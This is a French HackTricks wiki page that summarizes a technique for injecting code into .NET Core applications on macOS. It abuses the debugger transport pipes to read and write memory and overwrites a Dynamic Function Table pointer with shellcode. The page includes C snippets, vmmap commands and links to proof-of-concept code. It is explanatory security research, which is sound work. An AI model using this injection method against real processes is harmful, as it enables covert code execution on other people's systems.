# Injection d'applications .Net sur macOS

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

**Il s'agit d'un résumé de l'article [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Consultez-le pour plus de détails !**

## Débogage .NET Core <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Établir une session de débogage** <a href="#net-core-debugging" id="net-core-debugging"></a>

La gestion de la communication entre le débogueur et le débogué dans .NET est gérée par [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp). Ce composant met en place deux tubes nommés par processus .NET comme vu dans [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127), qui sont initiés via [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27). Ces tubes sont suffixés par **`-in`** et **`-out`**.

En visitant le répertoire **`$TMPDIR`** de l'utilisateur, on peut trouver des FIFOs de débogage disponibles pour déboguer des applications .Net.

[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) est responsable de la gestion de la communication depuis un débogueur. Pour initier une nouvelle session de débogage, un débogueur doit envoyer un message via le tube `out` commençant par une structure `MessageHeader`, détaillée dans le code source .NET :
```c
struct MessageHeader {
MessageType   m_eType;        // Message type
DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
DWORD         m_dwId;         // Message ID from sender
DWORD         m_dwReplyId;    // Reply-to Message ID
DWORD         m_dwLastSeenId; // Last seen Message ID by sender
DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
union {
struct {
DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;
BYTE          m_sMustBeZero[8];
}
```
Pour demander une nouvelle session, cette structure est remplie comme suit, en définissant le type de message sur `MT_SessionRequest` et la version du protocole sur la version actuelle :
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Configure the message type and version
sSendHeader.m_eType = MT_SessionRequest;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
Ce titre est ensuite envoyé à la cible en utilisant l'appel système `write`, suivi de la structure `sessionRequestData` contenant un GUID pour la session :
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
Une opération de lecture sur le tuyau `out` confirme le succès ou l'échec de l'établissement de la session de débogage :
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
## Lecture de la mémoire
Une fois qu'une session de débogage est établie, la mémoire peut être lue en utilisant le type de message [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). La fonction readMemory est détaillée, effectuant les étapes nécessaires pour envoyer une demande de lecture et récupérer la réponse :
```c
bool readMemory(void *addr, int len, unsigned char **output) {
// Allocation and initialization
...
// Write header and read response
...
// Read the memory from the debuggee
...
return true;
}
```
Le concept de preuve complet (POC) est disponible [ici](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).

## Écriture en mémoire

De même, la mémoire peut être écrite en utilisant la fonction `writeMemory`. Le processus implique de définir le type de message sur `MT_WriteMemory`, de spécifier l'adresse et la longueur des données, puis d'envoyer les données :
```c
bool writeMemory(void *addr, int len, unsigned char *input) {
// Increment IDs, set message type, and specify memory location
...
// Write header and data, then read the response
...
// Confirm memory write was successful
...
return true;
}
```
Le POC associé est disponible [ici](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).

## Exécution de code .NET Core <a href="#net-core-code-execution" id="net-core-code-execution"></a>

Pour exécuter du code, il est nécessaire d'identifier une région mémoire avec des permissions rwx, ce qui peut être fait en utilisant vmmap -pages:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
Localiser un endroit pour écraser un pointeur de fonction est nécessaire, et dans .NET Core, cela peut être fait en ciblant la **Table de Fonctions Dynamiques (DFT)**. Cette table, détaillée dans [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h), est utilisée par le runtime pour les fonctions d'aide à la compilation JIT.

Pour les systèmes x64, la chasse aux signatures peut être utilisée pour trouver une référence au symbole `_hlpDynamicFuncTable` dans `libcorclr.dll`.

La fonction de débogage `MT_GetDCB` fournit des informations utiles, y compris l'adresse d'une fonction d'aide, `m_helperRemoteStartAddr`, indiquant l'emplacement de `libcorclr.dll` dans la mémoire du processus. Cette adresse est ensuite utilisée pour démarrer une recherche de la DFT et écraser un pointeur de fonction avec l'adresse du shellcode.

Le code POC complet pour l'injection dans PowerShell est accessible [ici](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).

## Références

* [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** 💬 le **groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
